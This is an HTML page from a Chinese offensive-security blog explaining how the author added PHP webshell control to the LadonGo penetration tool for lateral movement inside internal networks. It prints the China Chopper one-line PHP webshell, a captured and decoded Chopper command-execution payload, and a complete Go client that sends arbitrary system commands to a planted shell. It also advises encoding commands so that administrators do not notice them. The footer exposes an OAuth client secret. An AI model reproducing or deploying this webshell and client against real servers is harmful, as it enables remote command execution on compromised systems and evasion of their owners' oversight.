@@ -1,0 +1,395 @@
+<!DOCTYPE html><html lang="en"><head>
+    <!--Setting-->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    <meta http-equiv="Cache-Control" content="no-siteapp">
+    <meta http-equiv="Cache-Control" content="no-transform">
+    <meta name="renderer" content="webkit|ie-comp|ie-stand">
+    <meta name="apple-mobile-web-app-capable" content="K8哥哥’s Blog">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="format-detection" content="telephone=no,email=no,adress=no">
+    <meta name="browsermode" content="application">
+    <meta name="screen-orientation" content="portrait">
+    <meta name="theme-version" content="1.0.0">
+    <meta name="root" content="/">
+    <link rel="dns-prefetch" href="http://k8gege.org">
+    <!--SEO-->
+
+<meta name="keywords" content="LadonGo">
+
+
+<meta name="description" content="背景
+最近VPS被人D比较卡，有时候M都不定连得上，或者连上了也难代理出来，所以需要一个命令行下连接内网WEBSHELL执行命令的工具，当然这个功能Ladon早有了。主要是因为在Linux下横向...">
+
+
+<meta name="robots" content="all">
+<meta name="google" content="all">
+<meta name="googlebot" content="all">
+<meta name="verify" content="all">
+    <!--Title-->
+
+<title>
+    
+    〖编程〗LadonGo菜刀PHP一句话连接执行CMD代码 |
+    
+    K8哥哥’s Blog
+</title>
+
+<link rel="alternate" href="/atom.xml" title="K8哥哥’s Blog" type="application/atom+xml">
+
+
+<link rel="icon" href="/favicon.ico">
+
+    
+
+
+<link rel="stylesheet" href="/css/bootstrap.min.css?rev=3.3.7.css">
+<link rel="stylesheet" href="/css/font-awesome.min.css?rev=4.7.0.css">
+<link rel="stylesheet" href="/css/style.css?rev=@@hash.css">
+
+    
+
+
+
+    
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<!--[if lte IE 8]>
+<style>
+    html{ font-size: 1em }
+</style>
+<![endif]-->
+<!--[if lte IE 9]>
+<div style="ie">你使用的浏览器版本过低，为了你更好的阅读体验，请更新浏览器的版本或者使用其他现代浏览器，比如Chrome、Firefox、Safari等。</div>
+<![endif]-->
+<body>
+    <header class="main-header" style="background-image:url(
+    https://www.cnblogs.com/skins/CodingLife/images/title-yellow.png)">
+    <div class="main-header-box">
+        <a class="header-avatar" href="/" title="K8gege">
+            <img alt="logo" class="img-responsive" referrerpolicy="no-referrer" data-original="/../images/avatar.png">
+			<h3 class="K8tilte">K8哥哥</h3>
+        </a>
+        <div class="branding">
+            <!--<h2 class="text-hide">没有绝对安全的系统</h2>-->
+            
+            <h2>
+                没有绝对安全的系统
+            </h2>
+            
+        </div>
+    </div>
+	
+</header>
+    <nav class="main-navigation">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="navbar-header"><span class="nav-toggle-button collapsed pull-right" data-toggle="collapse" data-target="#main-menu" id="mnav">
+                        <span class="sr-only"></span>
+                        <i class="fa fa-bars"></i>
+                    </span>
+                    <a class="navbar-brand" href="http://k8gege.org">
+                        K8哥哥’s Blog</a>
+                </div>
+                <div class="collapse navbar-collapse" id="main-menu">
+                    <ul class="menu">
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/"><i class="fa "></i>
+                                Home</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/Ladon/"><i class="fa "></i>
+                                Ladon</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Code/"><i class="fa "></i>
+                                Code</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Exp/"><i class="fa "></i>
+                                Exp</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/tags/Tool/"><i class="fa "></i>
+                                Tool</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/archives/"><i class="fa "></i>
+                                Archives</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/friends/"><i class="fa "></i>
+                                Friends</a>
+                        </li>
+                        
+                        <li role="presentation" class="text-center">
+                            <a href="/atom.xml"><i class="fa "></i>
+                                Rss</a>
+                        </li>
+                        
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+</nav>
+    <section class="content-wrap">
+        <div class="container">
+            <div class="row">
+                <main class="col-md-8 main-content m-post">
+                    <p id="process"></p>
+<article class="post">
+    <div class="post-head">
+        <h1 id="〖编程〗LadonGo菜刀PHP一句话连接执行CMD代码">
+            
+            〖编程〗LadonGo菜刀PHP一句话连接执行CMD代码
+            
+        </h1>
+        <div class="post-meta">
+    
+    <span class="categories-meta fa-wrap">
+        <i class="fa fa-folder-open-o"></i>
+        <a class="category-link" href="/categories/Ladon/">Ladon</a>
+    </span>
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-tags"></i>
+        <span class="tags-meta">
+            
+            <a class="tag-none-link" href="/tags/LadonGo/" rel="tag">LadonGo</a>
+            
+        </span>
+    </span>
+    
+    
+    
+    <span class="fa-wrap">
+        <i class="fa fa-clock-o"></i>
+        <span class="date-meta">
+            2021/02/03</span>
+    </span>
+    
+    <span class="fa-wrap">
+        <i class="fa fa-eye"></i>
+        <span id="busuanzi_value_page_pv"></span>
+    </span>
+    
+    
+</div>
+        
+        
+        <p class="fa fa-exclamation-triangle warning">
+            本文于<strong>
+                1535</strong>
+            天之前发表
+        </p>
+        
+    </div>
+    
+    <div class="post-body post-content">
+        <h3 id="背景">背景</h3>
+<p>最近VPS被人D比较卡，有时候M都不定连得上，或者连上了也难代理出来，所以需要一个命令行下连接内网WEBSHELL执行命令的工具，当然这个功能Ladon早有了。主要是因为在Linux下横向渗透连接内网其它机器执行命令，GO版还没有，所以先给LadonGo添加PHP一句话的连接功能，其它webshell有空再加。</p>
+<p>PS：其实主要是另一个原因，好像M在某个LNX环境下有问题，兼容性非常差有个BUG，NC或代理工具等可连网程序通过M执行后经常容易僵尸进程，出此意外得重启M或重启系统才行，而出现僵尸进程时又还显示网络连接时，很容易被管理员发现，所以代理等连网程序能不用就不用。</p>
+<h3 id="菜刀PHP一句话">菜刀PHP一句话</h3>
+<!--?php @eval($_POST[tom])?-->
+<h3 id="连接执行代码">连接执行代码</h3>
+<p>通过Post提交tom参数，可执行PHP代码，如tom=phpinfo();<br>
+<img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203233608962.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70">当然也可以简单粗暴的执行cmd命令，如tom=system(whoami);<br>
+<img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203233848425.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70">但是这样过于明显，会直接暴露我们执行的命令，所以最好做个加密</p>
+<h3 id="菜刀一句话抓包">菜刀一句话抓包</h3>
+<p>使用菜刀原版或K8飞刀的菜刀模式连接PHP一句话执行命令<br>
+<img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203233213599.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"><br>
+K8飞刀的菜刀选项连接PHP一句话，抓包内容如下：</p>
+<p>tom=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=Y21k&amp;z2=Y2QgL2QgIkM6XHBocFN0dWR5XFBIUFR1dG9yaWFsXFdXVyImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd</p>
+<p>可以看到提交的包使用了URL编码和Base64编码，想知道菜刀如何通讯执行CMD命令或者说有无后门，我们就得将其解密。几年前我曾发过抓过狗菜刀的后门，和此文章同理。</p>
+<h3 id="验证数据包">验证数据包</h3>
+<p>K8飞刀-HackIE模块可测试提交抓到的包，看其是否能正常工作<br>
+<img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203233347275.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
+<h3 id="URL编码解密">URL编码解密</h3>
+<p>打开K8飞刀–编码模块(第3个图标)–粘贴抓包数据–复制需要解密的内容–右键编码转换–URL编码–URL编码解密<br>
+<img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203231109281.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
+<h3 id="Base64编码解密z1">Base64编码解密z1</h3>
+<p>K8飞刀–右键选中Z1后面内容—编码转换–Base64编码–Base64编码解密<br>
+<img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203231139358.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
+<h3 id="Base64编码解密z2">Base64编码解密z2</h3>
+<p><img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203231223315.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
+<h3 id="明文结果">明文结果</h3>
+<p><img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203231245828.PNG">完全解密后，我们发现整段代码执行命令参数在z2，执行cmd的post包直接替换z2参数中的whoami再转成base64编码即可实现菜刀连接PHP一句话执行CMD的功能。</p>
+<p>tom=@eval(base64_decode($_POST[z0]));&amp;z0=@ini_set(“display_errors”,“0”);@set_time_limit(0);@set_magic_quotes_runtime(0);echo(“-&gt;|”);;$p=base64_decode($_POST[“z1”]);$s=base64_decode($_POST[“z2”]);$d=dirname($_SERVER[“SCRIPT_FILENAME”]);$c=substr($d,0,1)==“/”?“-c "{$s}"”:“/c "{$s}"”;$r=“{$p} {$c}”;@system($r." 2&gt;&amp;1",$ret);print ($ret!=0)?"<br>
+ret={$ret}<br>
+“:”“;;echo(”|&lt;-");die();&amp;z1=Y21k&amp;z2=cd /d “C:\phpStudy\PHPTutorial\WWW”&amp;whoami&amp;echo [S]&amp;cd&amp;echo [E]</p>
+<h3 id="Go连接PHP一句话">Go连接PHP一句话</h3>
+<figure class="highlight go"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> rexec</span><br><span class="line"><span class="comment">//Ladon Scanner for golang</span></span><br><span class="line"><span class="comment">//Author: k8gege</span></span><br><span class="line"><span class="comment">//K8Blog: http://k8gege.org/Ladon</span></span><br><span class="line"><span class="comment">//Github: https://github.com/k8gege/LadonGo</span></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    _<span class="string">"compress/gzip"</span></span><br><span class="line">    <span class="string">"encoding/base64"</span></span><br><span class="line">    <span class="string">"fmt"</span></span><br><span class="line">    <span class="string">"io/ioutil"</span></span><br><span class="line">    <span class="string">"net/http"</span></span><br><span class="line">    <span class="string">"regexp"</span></span><br><span class="line">    <span class="string">"strings"</span></span><br><span class="line">)</span><br><span class="line"><span class="keyword">var</span> PhpShellHelp = <span class="function"><span class="keyword">func</span> <span class="params">()</span></span> {</span><br><span class="line">    fmt.Println(<span class="string">"Usage: Ladon PhpShell url pwd cmd"</span>)</span><br><span class="line">    fmt.Println(<span class="string">"Example: Ladon PhpShell http://192.168.1.8/1.php pass whoami"</span>)</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">PhpShellExec</span><span class="params">(url,pwd,cmdline <span class="type">string</span>)</span></span> {</span><br><span class="line">    payload := <span class="string">"echo '&lt;result&gt;';&amp;"</span>+cmdline+<span class="string">"&amp;echo '&lt;/result&gt;';"</span></span><br><span class="line">    encodeString := base64.StdEncoding.EncodeToString([]<span class="type">byte</span>(payload))</span><br><span class="line">    data :=pwd+<span class="string">`=%40eval%01%28base64_decode%28%24_POST%5Bz0%5D%29%29%3B&amp;z0=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs%3D&amp;z1=Y21k&amp;z2=`</span></span><br><span class="line">    req, _ := http.NewRequest(<span class="string">"POST"</span>, url, strings.NewReader(data+encodeString))</span><br><span class="line">    req.Header.Set(<span class="string">"User-Agent"</span>, <span class="string">"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"</span>)</span><br><span class="line">    req.Header.Set(<span class="string">"Connection"</span>, <span class="string">"keep-alive"</span>)</span><br><span class="line">    req.Header.Set(<span class="string">"Content-Type"</span>, <span class="string">"application/x-www-form-urlencoded"</span>)</span><br><span class="line">    req.Header.Set(<span class="string">"Accept-Encoding"</span>, <span class="string">"gzip,deflate"</span>)</span><br><span class="line">    resp, err := (&amp;http.Client{}).Do(req)</span><br><span class="line">    <span class="keyword">if</span> err != <span class="literal">nil</span> {</span><br><span class="line">        fmt.Println(<span class="string">"error"</span>)</span><br><span class="line">    }</span><br><span class="line">    body, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">    <span class="comment">//fmt.Println(string(body))</span></span><br><span class="line">    reg := regexp.MustCompile(<span class="string">`-&gt;\|(?s:(.*?))\|&lt;-`</span>)</span><br><span class="line">    <span class="keyword">if</span> reg == <span class="literal">nil</span> {</span><br><span class="line">        fmt.Println(<span class="string">"regex error"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    }</span><br><span class="line">    str := <span class="type">string</span>(body)</span><br><span class="line">    result := reg.FindAllStringSubmatch(str,<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">for</span> _, text := <span class="keyword">range</span> result {</span><br><span class="line">        fmt.Println(text[<span class="number">1</span>])</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
+<p>PS: C#版代码可参考K8fly</p>
+<h3 id="LadonGo连接">LadonGo连接</h3>
+<p>Ladon phpshell <a target="_blank" rel="noopener" href="http://192.168.1.8/1.php">http://192.168.1.8/1.php</a> k8 whoami<br>
+<img alt="在这里插入图片描述" data-original="https://img-blog.csdnimg.cn/20210203231308144.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2s4Z2VnZQ==,size_16,color_FFFFFF,t_70"></p>
+<h3 id="Ladon连接">Ladon连接</h3>
+<p>062 WebShell远程执行命令（非交互式）</p>
+<p>Usage：Ladon WebShell ScriptType ShellType url pwd cmd<br>
+Example: Ladon WebShell jsp ua <a target="_blank" rel="noopener" href="http://192.168.1.8/shell.jsp">http://192.168.1.8/shell.jsp</a> Ladon whoami<br>
+Example: Ladon WebShell aspx cd <a target="_blank" rel="noopener" href="http://192.168.1.8/1.aspx">http://192.168.1.8/1.aspx</a> Ladon whoami<br>
+Example: Ladon WebShell php ua <a target="_blank" rel="noopener" href="http://192.168.1.8/1.php">http://192.168.1.8/1.php</a> Ladon whoami</p>
+<h3 id="下载">下载</h3>
+<p><a target="_blank" rel="noopener" href="https://github.com/k8gege/Ladon">https://github.com/k8gege/Ladon</a><br>
+<a target="_blank" rel="noopener" href="https://github.com/k8gege/LadonGo">https://github.com/k8gege/LadonGo</a></p>
+
+    </div>
+    
+    <div class="reward" ontouchstart="">
+    <div class="reward-wrap">
+	<img height="180" width="180" data-original="../images/k8join2.png">
+
+    </div>
+    <p class="reward-tip">
+        扫码加入K8小密圈
+    </p>
+</div>
+    
+    <div class="post-footer">
+        <div>
+            
+            转载声明：
+            商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="http://k8gege.org" target="_blank">K8gege</a>
+            
+            
+        </div>
+        <div>
+            
+        </div>
+    </div>
+</article>
+<div class="article-nav prev-next-wrap clearfix">
+    
+    <a href="/p/Ladon_bypassUAC.html" class="pre-post btn btn-default" title="〖提权〗Ladon 8.0五种白名单方法BypaaUAC">
+        <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
+        <span class="hidden-xs">
+            〖提权〗Ladon 8.0五种白名单方法BypaaUAC</span>
+    </a>
+    
+    
+    <a href="/p/Ladon_snmp.html" class="next-post btn btn-default" title="〖编程〗LadonGo使用SNMP协议探测存活主机原理">
+        <span class="hidden-lg">下一篇</span>
+        <span class="hidden-xs">
+            〖编程〗LadonGo使用SNMP协议探测存活主机原理</span><i class="fa fa-angle-right fa-fw"></i>
+    </a>
+    
+</div>
+
+<div id="comments">
+    
+<link rel="stylesheet" href="https://cdn.bootcss.com/gitalk/1.4.1/gitalk.min.css">
+<script src="//cdn.bootcss.com/gitalk/1.4.1/gitalk.min.js"></script>
+<script src="//cdn.bootcss.com/blueimp-md5/2.9.0/js/md5.min.js"></script>
+<div id="gitalk-container"></div>
+<script type="text/javascript">
+var gitalk = new Gitalk({
+    // Gitalk配置
+    language: "en",
+    clientID: "b2247720d5b50a30fbe7",
+    clientSecret: "fbd720b7c84bea4de2ac3bef40b37509ccca0267",
+    repo: "k8gege.github.io",
+    owner: "k8gege",
+    admin: ["k8gege"],
+    id: md5(location.pathname),
+    distractionFreeMode: true
+});
+gitalk.render('gitalk-container');
+</script>
+
+</div>
+
+                </main>
+                
+                    <aside id="article-toc" role="navigation" class="col-md-4">
+    <div class="widget">
+        <h3 class="title">
+            Table of Contents
+        </h3>
+        
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%8C%E6%99%AF"><span class="toc-text">背景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8F%9C%E5%88%80PHP%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-text">菜刀PHP一句话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9E%E6%8E%A5%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-text">连接执行代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8F%9C%E5%88%80%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%8A%93%E5%8C%85"><span class="toc-text">菜刀一句话抓包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%95%B0%E6%8D%AE%E5%8C%85"><span class="toc-text">验证数据包</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#URL%E7%BC%96%E7%A0%81%E8%A7%A3%E5%AF%86"><span class="toc-text">URL编码解密</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Base64%E7%BC%96%E7%A0%81%E8%A7%A3%E5%AF%86z1"><span class="toc-text">Base64编码解密z1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Base64%E7%BC%96%E7%A0%81%E8%A7%A3%E5%AF%86z2"><span class="toc-text">Base64编码解密z2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%8E%E6%96%87%E7%BB%93%E6%9E%9C"><span class="toc-text">明文结果</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Go%E8%BF%9E%E6%8E%A5PHP%E4%B8%80%E5%8F%A5%E8%AF%9D"><span class="toc-text">Go连接PHP一句话</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LadonGo%E8%BF%9E%E6%8E%A5"><span class="toc-text">LadonGo连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ladon%E8%BF%9E%E6%8E%A5"><span class="toc-text">Ladon连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8B%E8%BD%BD"><span class="toc-text">下载</span></a></li></ol>
+        
+    </div>
+</aside>
+                
+            </div>
+        </div>
+    </section>
+    <footer class="main-footer">
+    <div class="container">
+        <div class="row">
+        </div>
+    </div>
+</footer>
+<a id="back-to-top" class="icon-btn hide">
+    <i class="fa fa-chevron-up"></i>
+</a>
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f0409af9df7ad2cc43cc334b4d9b515";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+ <script type="text/javascript" src="http://libs.baidu.com/jquery/1.11.1/jquery.min.js"></script>
+ <script src="https://cdn.bootcdn.net/ajax/libs/lazysizes/5.3.2/lazysizes.min.js" async=""></script>
+
+    <div class="copyright">
+    <div class="container">
+        <div class="row">
+            <div class="col-sm-12">
+                <div class="busuanzi">
+    
+    Total:
+    <strong id="busuanzi_value_site_pv">
+        <i class="fa fa-spinner fa-spin"></i>
+    </strong>
+	<!-- 
+    &nbsp; | &nbsp;
+    
+	Visitors:
+    <strong id="busuanzi_value_site_uv">
+        <i class="fa fa-spinner fa-spin"></i> 
+    </strong>
+	-->
+    
+</div>
+            </div>
+            <div class="col-sm-12">
+                <span>Copyright ©
+                    2020
+                    
+                </span> |
+                <span>
+                    Powered by <a href="//k8gege.org" class="copyright-links" target="_blank" rel="nofollow">K8gege</a>
+                </span>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script async="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+<script src="/js/app.js?rev=@@hash.js"></script>
+
+
+</body></html>
